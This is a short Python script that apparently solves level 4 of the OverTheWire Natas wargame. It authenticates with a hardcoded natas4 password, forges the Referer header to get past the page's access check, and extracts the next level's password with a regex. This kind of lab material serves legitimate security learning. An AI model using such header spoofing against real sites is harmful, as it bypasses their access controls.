import requests
import re

session = requests.session()
session.auth = ('natas4',"Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ")
session.headers.update({"Referer":"http://natas5.natas.labs.overthewire.org/"})
game = session.get("http://natas4.natas.labs.overthewire.org/index.php")
nextcode = re.findall('[a-zA-Z0-9]{32}',game.text)

print(nextcode[1])



